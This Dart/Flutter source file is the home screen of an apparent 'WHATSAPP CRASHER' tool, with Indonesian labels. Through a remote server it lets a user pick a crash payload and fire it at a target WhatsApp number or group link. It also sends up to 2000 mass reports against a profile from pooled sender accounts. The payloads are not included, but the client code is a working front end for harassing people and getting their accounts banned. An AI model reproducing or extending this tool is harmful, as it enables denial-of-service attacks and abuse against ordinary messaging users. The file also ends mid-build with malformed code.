import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'widgets/custom_popup.dart';
import 'bug_sender.dart';

class HomePage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;

  const HomePage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
  final targetController = TextEditingController();
  final reportCountController = TextEditingController(text: "50");
  late AnimationController _pulseController;
  String selectedBugId = "";
  VideoPlayerController? _videoController;

  // --- State: Mode Target ---
  // 'number' | 'group' | 'report'
  String _selectedBugMode = "number";

  // --- State: Mode Sender ---
  String _senderMode = "private"; // 'private' atau 'global'
  int _privateSenderCount = 0;
  int _globalSenderCount = 0;

  bool _isSending = false;

  // --- Tema Warna (TETAP SAMA) ---
  final Color primaryBg = const Color(0xFFF3E9D2);
  final Color cardBg = const Color(0xFFFFFDF5);
  final Color sectionBg = const Color(0xFFFFFFFF);
  final Color borderColor = const Color(0xFF111111);
  final Color accentWhite = const Color(0xFFFFD43B);
  final Color textGrey = Colors.black54;

  @override
  void initState() {
    super.initState();

    _videoController = VideoPlayerController.asset('assets/videos/bug.mp4')
      ..initialize().then((_) {
        setState(() {});
        _videoController?.setVolume(1.0);
        _videoController?.setLooping(true);
        _videoController?.play();
      });

    _pulseController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1500),
    )..repeat(reverse: true);

    // Filter bug default
    if (widget.listBug.isNotEmpty) {
      final initialBugs = _getFilteredBugs();
      if (initialBugs.isNotEmpty) {
        selectedBugId = initialBugs[0]['bug_id'];
      }
    }

    _fetchSenderStats();
  }

  // --- FUNGSI: Filter Bug ---
  List<Map<String, dynamic>> _getFilteredBugs() {
    if (_selectedBugMode == "report") return [];
    if (_selectedBugMode == "group") {
      return widget.listBug.where((b) => b['bug_id'].contains('_group')).toList();
    } else {
      return widget.listBug.where((b) => !b['bug_id'].contains('_group')).toList();
    }
  }

  // --- FUNGSI: Ambil Statistik Sender ---
  Future<void> _fetchSenderStats() async {
    try {
      final res = await http.get(Uri.parse(
          "http://public.queen-official.com:2302/getSenderStats?key=${widget.sessionKey}"));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() {
            _privateSenderCount = data['private'] ?? 0;
            _globalSenderCount = data['global'] ?? 0;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching sender stats: $e");
    }
  }

  @override
  void dispose() {
    _videoController?.dispose();
    _pulseController.dispose();
    targetController.dispose();
    reportCountController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('') || cleaned.length < 8) return null;
    return cleaned;
  }

  bool isValidGroupLink(String input) {
    return input.contains('chat.whatsapp.com') && input.contains('https://');
  }

  Future<void> _sendBug() async {
    final rawInput = targetController.text.trim();
    final key = widget.sessionKey;

    if (_selectedBugMode == "number") {
      final target = formatPhoneNumber(rawInput);
      if (target == null || key.isEmpty) {
        _showAlert("Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
        return;
      }
    } else {
      if (!isValidGroupLink(rawInput)) {
        _showAlert("Invalid Link", "Masukkan link group WA yang valid (contoh: https://chat.whatsapp.com/...).");
        return;
      }
    }

    final currentBugs = _getFilteredBugs();
    if (!currentBugs.any((b) => b['bug_id'] == selectedBugId)) {
      if (currentBugs.isNotEmpty) {
        setState(() {
          selectedBugId = currentBugs[0]['bug_id'];
        });
      } else {
        _showAlert("Error", "Tidak ada bug tersedia untuk mode ini.");
        return;
      }
    }

    setState(() {
      _isSending = true;
    });

    final effectiveSenderMode = (widget.role == 'owner' || widget.role == 'vip') 
        ? _senderMode 
        : 'private';

    try {
      final res = await http.get(Uri.parse(
          "http://public.queen-official.com:2302/sendBug?key=$key&target=$rawInput&bug=$selectedBugId&senderMode=$effectiveSenderMode"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Tunggu beberapa saat sebelum mengirim lagi.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Key Invalid", "Sesi Anda tidak valid. Silakan login ulang.");
      } else if (data["sended"] == false) {
        _showAlert("⚠️ Gagal", "Server sedang maintenance atau terjadi kegagalan.");
      } else {
        _showAlert("✅ Berhasil", "Bug sukses dikirim ke target!");
        targetController.clear();
        _fetchSenderStats();
      }
    } catch (_) {
      _showAlert("❌ Error", "Terjadi kesalahan pada sistem. Coba lagi nanti.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  // ============================================================
  // FUNGSI BARU: SEND REPORT PROFILE
  // ============================================================
  Future<void> _sendReport() async {
    final rawTarget = targetController.text.trim();
    final target = formatPhoneNumber(rawTarget);
    final key = widget.sessionKey;
    final count = int.tryParse(reportCountController.text.trim()) ?? 50;

    if (target == null || key.isEmpty) {
      _showAlert("Invalid Number", "Gunakan nomor internasional (misal: +62, 1, 44).");
      return;
    }

    if (count < 1 || count > 2000) {
      _showAlert("Invalid Count", "Jumlah report harus 1 - 2000.");
      return;
    }

    setState(() {
      _isSending = true;
    });

    final effectiveSenderMode = (widget.role == 'owner' || widget.role == 'vip')
        ? _senderMode
        : 'private';

    try {
      final res = await http.get(Uri.parse(
          "http://public.queen-official.com:2302/reportProfile?key=$key&target=$target&count=$count&senderMode=$effectiveSenderMode"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("⏳ Cooldown", "Tunggu ${data['wait'] ?? 0} detik sebelum report lagi.");
      } else if (data["valid"] == false) {
        _showAlert("❌ Gagal", data["message"] ?? "Sesi tidak valid.");
      } else if (data["sended"] == true) {
        _showAlert(
          "✅ Report Terkirim",
          "$count report dikirim ke $target\nMode: $effectiveSenderMode\nSenders: ${data['senders'] ?? 1}",
        );
        targetController.clear();
        _fetchSenderStats();
      } else {
        _showAlert("⚠️ Gagal", "Server menolak permintaan.");
      }
    } catch (_) {
      _showAlert("❌ Error", "Gagal terhubung ke server.");
    } finally {
      setState(() {
        _isSending = false;
      });
    }
  }

  void _showAlert(String title, String msg) {
    if (!mounted) return;
    CustomPopup.display(
      context,
      title: title,
      message: msg,
      icon: title.contains("✅") ? Icons.check_circle_outline : Icons.error_outline,
      iconColor: title.contains("✅") ? Colors.green : Colors.redAccent,
      confirmText: "Close",
    );
  }

  // ============================================================
  //  TAMPILAN BARU TOTAL - HOME PAGE
  // ============================================================

  Widget _buildTopHeader() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(24),
        border: Border.all(color: Colors.redAccent.withOpacity(0.2), width: 3),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.18),
            blurRadius: 0,
            offset: const Offset(6, 6),
          ),
        ],
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              color: Colors.redAccent.withOpacity(0.12),
              shape: BoxShape.circle,
              border: Border.all(color: Colors.redAccent.withOpacity(0.3)),
            ),
            child: const Icon(Icons.bug_report_outlined, color: Colors.redAccent, size: 30),
          ),
          const SizedBox(width: 18),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  "WHATSAPP CRASHER",
                  style: TextStyle(
                    color: Colors.black87,
                    fontFamily: 'Orbitron',
                    fontWeight: FontWeight.w900,
                    fontSize: 20,
                    letterSpacing: 1.5,
                  ),
                ),
                const SizedBox(height: 6),
                Text(
                  "Advanced Payload Injection Tool",
                  style: TextStyle(
                    color: textGrey.withOpacity(0.7),
                    fontFamily: 'ShareTechMono',
                    fontSize: 12,
                    letterSpacing: 0.5,
                  ),
                ),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: Colors.green.withOpacity(0.1),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(color: Colors.green.withOpacity(0.2)),
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 6,
                  height: 6,
                  decoration: const BoxDecoration(
                    shape: BoxShape.circle,
                    color: Colors.green,
                    boxShadow: [
                      BoxShadow(
              offset: const Offset(6, 6),
                        color: Colors.green,
                        blurRadius: 0,
                        spreadRadius: 1,
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 6),
                const Text(
                  "ONLINE",
                  style: TextStyle(
                    color: Colors.green,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'Orbitron',
                    fontSize: 10,
                    letterSpacing: 1,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSelectionButton({
    required String title,
    required String value,
    required IconData icon,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 18),
        decoration: BoxDecoration(
          color: sectionBg,
          borderRadius: BorderRadius.circular(18),
          border: Border.all(color: borderColor, width: 3.5),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.18),
              blurRadius: 0,
              offset: const Offset(6, 6),
            ),
          ],
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: accentWhite.withOpacity(0.1),
                borderRadius: BorderRadius.circular(18),
              ),
              child: Icon(icon, color: accentWhite, size: 24),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: TextStyle(
                      color: textGrey.withOpacity(0.6),
                      fontSize: 11,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1.2,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    value,
                    style: const TextStyle(
                      color: Colors.black87,
                      fontSize: 16,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'ShareTechMono',
                    ),
                  ),
                ],
              ),
            ),
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: accentWhite.withOpacity(0.08),
                borderRadius: BorderRadius.circular(18),
              ),
              child: const Icon(Icons.keyboard_arrow_right_rounded, color: Colors.black54, size: 24),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildPopupOption({
    required IconData icon,
    required Color color,
    required String title,
    String? sub,
    required VoidCallback onTap,
  }) {
    return InkWell(
      onTap: onTap,
      borderRadius: BorderRadius.circular(18),
      child: Container(
        padding: const EdgeInsets.all(18),
        decoration: BoxDecoration(
          color: Colors.white,
          borderRadius: BorderRadius.circular(18),
          border: Border.all(color: Colors.black),
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: color.withOpacity(0.1),
                shape: BoxShape.circle,
              ),
              child: Icon(icon, color: color, size: 24),
            ),
            const SizedBox(width: 16),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    title,
                    style: const TextStyle(
                      color: Colors.black87,
                      fontWeight: FontWeight.bold,
                      fontSize: 15,
                    ),
                  ),
                  if (sub != null)
                    Text(
                      sub,
                      style: TextStyle(
                        color: Colors.black54,
                        fontSize: 12,
                      ),
                    ),
                ],
              ),
            ),
            const Icon(Icons.arrow_forward_ios, color: Colors.black26, size: 14),
          ],
        ),
      ),
    );
  }

  void _showTargetTypePopup() {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.4),
      builder: (context) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Dialog(
          backgroundColor: Colors.transparent,
          elevation: 0,
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: const Color(0xFFFFFDF5),
              borderRadius: BorderRadius.circular(24),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.18),
                  blurRadius: 0,
                  offset: const Offset(6, 6),
                ),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                  decoration: BoxDecoration(
                    color: accentWhite.withOpacity(0.08),
                    borderRadius: BorderRadius.circular(18),
                  ),
                  child: const Text(
                    "PILIH TARGET",
                    style: TextStyle(
                      color: Colors.black87,
                      fontFamily: 'Orbitron',
                      fontSize: 16,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1.0,
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                _buildPopupOption(
                  icon: Icons.phone_android_rounded,
                  color: accentWhite,
                  title: "BUG NOMOR",
                  sub: "Targetkan nomor WhatsApp individu",
                  onTap: () {
                    setState(() {
                      _selectedBugMode = "number";
                      targetController.clear();
                      final newBugs = _getFilteredBugs();
                      if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
                    });
                    Navigator.pop(context);
                  },
                ),
                const SizedBox(height: 12),
                _buildPopupOption(
                  icon: Icons.group_add,
                  color: accentWhite,
                  title: "BUG GROUP",
                  sub: "Targetkan link grup WhatsApp",
                  onTap: () {
                    setState(() {
                      _selectedBugMode = "group";
                      targetController.clear();
                      final newBugs = _getFilteredBugs();
                      if (newBugs.isNotEmpty) selectedBugId = newBugs[0]['bug_id'];
                    });
                    Navigator.pop(context);
                  },
                ),
                const SizedBox(height: 12),
                // ===== OPSI BARU: REPORT PROFILE =====
                _buildPopupOption(
                  icon: Icons.report_gmailerrorred_rounded,
                  color: Colors.redAccent,
                  title: "REPORT PROFILE",
                  sub: "Laporkan akun WhatsApp secara massal",
                  onTap: () {
                    setState(() {
                      _selectedBugMode = "report";
                      targetController.clear();
                      reportCountController.text = "50";
                      selectedBugId = "";
                    });
                    Navigator.pop(context);
                  },
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  void _showSenderTypePopup() {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.4),
      builder: (context) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: Dialog(
          backgroundColor: Colors.transparent,
          elevation: 0,
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: const Color(0xFFFFFDF5),
              borderRadius: BorderRadius.circular(24),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.18),
                  blurRadius: 0,
                  offset: const Offset(6, 6),
                ),
              ],
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                  decoration: BoxDecoration(
                    color: accentWhite.withOpacity(0.08),
                    borderRadius: BorderRadius.circular(18),
                  ),
                  child: const Text(
                    "PILIH SENDER",
                    style: TextStyle(
                      color: Colors.black87,
                      fontFamily: 'Orbitron',
                      fontSize: 16,
                      fontWeight: FontWeight.w900,
                      letterSpacing: 1.0,
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                _buildPopupOption(
                  icon: Icons.person_outline,
                  color: accentWhite,
                  title: "PRIVATE SENDER",
                  sub: "$_privateSenderCount active",
                  onTap: () {
                    setState(() => _senderMode = 'private');
                    Navigator.pop(context);
                  },
                ),
                const SizedBox(height: 12),
                _buildPopupOption(
                  icon: Icons.public,
                  color: accentWhite,
                  title: "GLOBAL SENDER",
                  sub: "$_globalSenderCount active",
                  onTap: () {
                    setState(() => _senderMode = 'global');
                    Navigator.pop(context);
                  },
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildInputPanel() {
    final availableBugs = _getFilteredBugs();
    final isReportMode = _selectedBugMode == "report";

    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(24),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.18),
            blurRadius: 0,
            offset: const Offset(6, 6),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: accentWhite.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(18),
                ),
                child: const Icon(Icons.settings_rounded, color: Color(0xFFFFD43B), size: 16),
              ),
              const SizedBox(width: 10),
              Text(
                isReportMode ? "Konfigurasi Report" : "Konfigurasi Serangan",
                style: const TextStyle(
                  color: Colors.black87,
                  fontWeight: FontWeight.bold,
                  fontSize: 14,
                  fontFamily: 'Orbitron',
                ),
              ),
            ],
          ),
          const SizedBox(height: 18),
          
          _buildSelectionButton(
            title: "TARGET TYPE",
            value: isReportMode
                ? "REPORT PROFILE"
                : (_selectedBugMode == "number" ? "BUG NOMOR" : "BUG GROUP"),
            icon: isReportMode
                ? Icons.report_gmailerrorred_rounded
                : (_selectedBugMode == "number"
                    ? Icons.phone_android_rounded
                    : Icons.group_add),
            onTap: _showTargetTypePopup,
          ),
          const SizedBox(height: 14),
          
          _buildSelectionButton(
            title: "MANAGE SENDERS",
            value: "MANAGE BUG SENDER",
            icon: Icons.sensors,
            onTap: () {
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (_) => BugSenderPage(
                    sessionKey: widget.sessionKey,
                    username: widget.username,
                    role: widget.role,
                  ),
                ),
              );
            },
          ),
          const SizedBox(height: 14),

          if (widget.role == 'owner' || widget.role == 'vip') ...[
            _buildSelectionButton(
              title: "SENDER MODE",
              value: _senderMode == 'private' ? "PRIVATE SENDER" : "GLOBAL SENDER",
              icon: _senderMode == 'private' ? Icons.person_outline : Icons.public,
              onTap: _showSenderTypePopup,
            ),
            const SizedBox(height: 20),
          ],
          
          // LABEL INPUT TARGET
          Padding(
            padding: const EdgeInsets.only(left: 4, bottom: 8),
            child: Row(
              children: [
                Icon(
                  isReportMode
                      ? Icons.phone_android_rounded
                      : (_selectedBugMode == "number"
                          ? Icons.phone_android_rounded
                          : Icons.link),
                  size: 16,
                  color: textGrey.withOpacity(0.5),
                ),
                const SizedBox(width: 8),
                Text(
                  isReportMode
                      ? "TARGET NUMBER (REPORT)"
                      : (_selectedBugMode == "number"
                          ? "TARGET NUMBER"
                          : "WHATSAPP GROUP LINK"),
                  style: TextStyle(
                    color: Colors.black87.withOpacity(0.6),
                    fontWeight: FontWeight.bold,
                    fontSize: 12,
                    fontFamily: 'Orbitron',
                    letterSpacing: 1.2,
                  ),
                ),
              ],
            ),
          ),
          
          // TEXTFIELD TARGET
          TextField(
            controller: targetController,
            style: const TextStyle(color: Colors.black87, fontSize: 16),
            cursorColor: accentWhite,
            keyboardType: (_selectedBugMode == "number" || isReportMode)
                ? TextInputType.phone
                : TextInputType.url,
            decoration: InputDecoration(
              hintText: (_selectedBugMode == "number" || isReportMode)
                  ? "e.g. +628123456789"
                  : "e.g. https://chat.whatsapp.com/...",
              hintStyle: TextStyle(color: textGrey.withOpacity(0.4)),
              filled: true,
              fillColor: sectionBg,
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(18),
                borderSide: BorderSide(color: borderColor),
              ),
              enabledBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(18),
                borderSide: BorderSide(color: borderColor),
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(18),
                borderSide: const BorderSide(color: Color(0xFFFFD43B), width: 2),
              ),
              prefixIcon: Container(
                margin: const EdgeInsets.symmetric(horizontal: 8),
                child: Icon(
                  isReportMode
                      ? Icons.report_gmailerrorred_rounded
                      : (_selectedBugMode == "number"
                          ? Icons.phone_android_rounded
                          : Icons.link),
                  color: accentWhite.withOpacity(0.7),
                  size: 22,
                ),
              ),
              contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 20),
            ),
          ),

          const SizedBox(height: 20),

          // ===== MODE REPORT: INPUT JUMLAH REPORT =====
          if (isReportMode) ...[
            Padding(
              padding: const EdgeInsets.only(left: 4, bottom: 8),
              child: Row(
                children: [
                  Icon(Icons.repeat_rounded, size: 16, color: textGrey.withOpacity(0.5)),
                  const SizedBox(width: 8),
                  Text(
                    "JUMLAH REPORT (LOOP)",
                    style: TextStyle(
                      color: Colors.black87.withOpacity(0.6),
                      fontWeight: FontWeight.bold,
                      fontSize: 12,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1.2,
                    ),
                  ),
                ],
              ),
            ),
            TextField(
              controller: reportCountController,
              style: const TextStyle(color: Colors.black87, fontSize: 16),
              cursorColor: accentWhite,
              keyboardType: TextInputType.number,
              decoration: InputDecoration(
                hintText: "e.g. 50 (max 2000)",
                hintStyle: TextStyle(color: textGrey.withOpacity(0.4)),
                filled: true,
                fillColor: sectionBg,
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(18),
                  borderSide: BorderSide(color: borderColor),
                ),
                enabledBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(18),
                  borderSide: BorderSide(color: borderColor),
                ),
                focusedBorder: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(18),
                  borderSide: const BorderSide(color: Color(0xFFFFD43B), width: 2),
                ),
                prefixIcon: Container(
                  margin: const EdgeInsets.symmetric(horizontal: 8),
                  child: Icon(Icons.tag, color: accentWhite.withOpacity(0.7), size: 22),
                ),
                contentPadding: const EdgeInsets.symmetric(vertical: 18, horizontal: 20),
              ),
            ),
            const SizedBox(height: 14),
            Container(
              padding: const EdgeInsets.all(14),
              decoration: BoxDecoration(
                color: Colors.redAccent.withOpacity(0.06),
                borderRadius: BorderRadius.circular(18),
                border: Border.all(color: Colors.redAccent.withOpacity(0.2)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.info_outline, color: Colors.redAccent, size: 18),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Text(
                      "Report massal dikirim dari sender yang kamu pilih. Semakin banyak sender aktif, semakin efektif.",
                      style: TextStyle(color: textGrey, fontSize: 12),
                    ),
                  ),
                ],
              ),
            ),
          ]
          // ===== MODE BUG: PAYLOAD SELECTION =====
          else if (availableBugs.isNotEmpty) ...[
            Padding(
              padding: const EdgeInsets.only(left: 4, bottom: 8),
              child: Row(
                children: [
                  Icon(Icons.bug_report_rounded, size: 16, color: textGrey.withOpacity(0.5)),
                  const SizedBox(width: 8),
                  Text(
                    "SELECT PAYLOAD BUG",
                    style: TextStyle(
                      color: Colors.black87.withOpacity(0.6),
                      fontWeight: FontWeight.bold,
                      fontSize: 12,
                      fontFamily: 'Orbitron',
                      letterSpacing: 1.2,
                    ),
                  ),
                ],
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
              decoration: BoxDecoration(
                color: sectionBg,
                borderRadius: BorderRadius.circular(18),
                border: Border.all(color: borderColor, width: 3.5),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.18),
                    blurRadius: 0,
                    offset: const Offset(6, 6),
                  ),
                ],
              ),
              child: DropdownButtonHideUnderline(
                child: DropdownButton<String>(
                  dropdownColor: sectionBg,
                  value: selectedBugId.isNotEmpty ? selectedBugId : null,
                  isExpanded: true,
                  icon: Container(
                    padding: const EdgeInsets.all(6),
                    decoration: BoxDecoration(
                      color: accentWhite.withOpacity(0.08),
                      borderRadius: BorderRadius.circular(18),
                    ),
                    child: const Icon(Icons.keyboard_arrow_down_rounded, color: Colors.black54),
                  ),
                  iconSize: 28,
                  style: const TextStyle(
                    color: Colors.black87,
                    fontSize: 15,
                    fontWeight: FontWeight.bold,
                    fontFamily: 'ShareTechMono',
                  ),
                  items: availableBugs.map((bug) {
                    return DropdownMenuItem<String>(
                      value: bug['bug_id'],
                      child: Row(
                        children: [
                          Container(
                            padding: const EdgeInsets.all(6),
                            decoration: BoxDecoration(
                              color: accentWhite.withOpacity(0.1),
                              borderRadius: BorderRadius.circular(18),
                            ),
                            child: Icon(Icons.bug_report, color: accentWhite, size: 18),
                          ),
                          const SizedBox(width: 12),
                          Expanded(child: Text(bug['bug_name'])),
                        ],
                      ),
                    );
                  }).toList(),
                  onChanged: (value) {
                    setState(() {
                      selectedBugId = value ?? "";
                    });
                  },
                ),
              ),
            ),
          ] else ...[
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: sectionBg,
                borderRadius: BorderRadius.circular(18),
                border: Border.all(color: Colors.red.withOpacity(0.2)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.warning_amber_rounded, color: Colors.orange, size: 20),
                  const SizedBox(width: 10),
                  const Text(
                    "No payload available for this mode",
                    style: TextStyle(color: Colors.black54, fontSize: 13),
                  ),
                ],
              ),
            ),
          ]
        ],
      ),
    );
  }

  Widget _buildSendButton() {
    final isReportMode = _selectedBugMode == "report";

    return AnimatedBuilder(
      animation: _pulseController,
      builder: (context, child) {
        return Container(
          height: 64,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(18),
            gradient: LinearGradient(
              colors: isReportMode
                  ? [Colors.redAccent.shade200, Colors.redAccent.shade700]
                  : [accentWhite.withOpacity(0.9), accentWhite],
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
            ),
            boxShadow: [
              BoxShadow(
                color: (isReportMode ? Colors.redAccent : accentWhite)
                    .withOpacity(0.3 + (0.1 * _pulseController.value)),
                blurRadius: 0,
                offset: const Offset(6, 6),
              ),
            ],
          ),
          child: ElevatedButton(
            onPressed: _isSending
                ? null
                : (isReportMode ? _sendReport : _sendBug),
            style: ElevatedButton.styleFrom(
              backgroundColor: Colors.transparent,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(18),
              ),
              elevation: 0,
              shadowColor: Colors.transparent,
              foregroundColor: Colors.white,
            ),
            child: _isSending
                ? const SizedBox(
                    height: 24,
                    width: 24,
                    child: CircularProgressIndicator(
                      color: Colors.white,
                      strokeWidth: 2.5,
                    ),
                  )
                : Row(
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Container(
                        padding: const EdgeInsets.all(6),
                        decoration: BoxDecoration(
                          color: Colors.white.withOpacity(0.2),
                          shape: BoxShape.circle,
                        ),
                        child: Icon(
                          isReportMode ? Icons.report : Icons.rocket_launch_outlined,
                          color: Colors.white,
                          size: 20,
                        ),
                      ),
                      const SizedBox(width: 12),
                      Text(
                        isReportMode ? "SEND REPORT" : "LAUNCH ATTACK",
                        style: const TextStyle(
                          color: Colors.white,
                          fontWeight: FontWeight.w900,
                          fontSize: 16,
                          letterSpacing: 2,
                          fontFamily: 'Orbitron',
                        ),
                      ),
                    ],
                  ),
          ),
        );
      },
    );
  }

  Widget _buildVideoSection() {
    if (_videoController == null || !_videoController!.value.isInitialized) {
      return Container(
        height: 200,
        decoration: BoxDecoration(
          color: cardBg,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: borderColor),
        ),
        child: const Center(
          child: CircularProgressIndicator(color: Color(0xFFFFD43B)),
        ),
      );
    }

    return Container(
      height: 220,
      width: double.infinity,
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: borderColor, width: 3),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.18),
            blurRadius: 0,
            offset: const Offset(6, 6),
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(18),
        child: Stack(
          fit: StackFit.expand,
          children: [
            SizedBox.expand(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController!.value.size.width,
                  height: _videoController!.value.size.height,
                  child: VideoPlayer(_videoController!),
                ),
              ),
            ),
            Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [
                    Colors.black.withOpacity(0.3),
                    Colors.transparent,
                  ],
                  begin: Alignment.bottomCenter,
                  end: Alignment.topCenter,
                ),
              ),
            ),
            Positioned(
              bottom: 16,
              right: 16,
              child: Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(
                  color: Colors.black.withOpacity(0.5),
                  borderRadius: BorderRadius.circular(18),
                ),
                child: const Text(
                  "V4.0",
                  style: TextStyle(
                    color: Colors.white,
                    fontSize: 10,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1,
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: primaryBg,
      body: WintrixUiFrame(
        accent: borderColor,
        child: Stack(
        children: [
          Positioned(
            top: -120,
            right: -90,
            child: IgnorePointer(
              child: Container(
                width: 280,
                height: 280,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: borderColor,
                ),
              ),
            ),
          ),
          Positioned(
            bottom: -150,
            left: -110,
            child: IgnorePointer(
              child: Container(
                width: 330,
                height: 330,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: borderColor,
                ),
              ),
            ),
          ),
          SafeArea(
            child: SingleChildScrollView(
              physics: const BouncingScrollPhysics(),
              padding: const EdgeInsets.fromLTRB(18, 14, 18, 30),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  _buildTopHeader(),
                  const SizedBox(height: 18),
                  Container(
                    padding: const EdgeInsets.all(5),
                    decoration: BoxDecoration(
                      color: sectionBg.withOpacity(0.60),
                      borderRadius: BorderRadius.circular(27),
                      border: Border.all(color: Colors.black),
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withOpacity(0.18),
                          blurRadius: 0,
                          offset: const Offset(6, 6),
                        ),
                      ],
                    ),
                    child: Column(
                      children: [
                        _buildVideoSection(),
                        const SizedBox(height: 5),
                        _buildInputPanel(),
                      ],
                    ),
